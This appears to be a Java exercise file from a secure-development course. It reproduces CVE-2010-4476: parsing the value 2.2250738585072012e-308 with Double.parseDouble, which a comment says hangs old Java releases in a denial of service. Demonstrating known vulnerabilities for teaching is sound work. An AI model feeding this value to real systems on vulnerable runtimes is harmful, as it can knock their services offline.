package be.howest.ti.secure.development.g1.g01;

public class ExampleG1G01 {
    public static void main(String[] args)
    {
        new ExampleG1G01().run();
    }

    public void run() {

    }

    //Created By Jürgen
    public void cve_2010_4476() {
        System.out.println("Starting...");
        //Causes a DoS on Java for Business 6 Update 23 and earlier, 5.0 Update 27 and earlier, and 1.4.2_29 and earlier,
        double d = Double.parseDouble("2.2250738585072012e-308");
        System.out.println("Value = " + d);
        System.out.println("End");
}
}
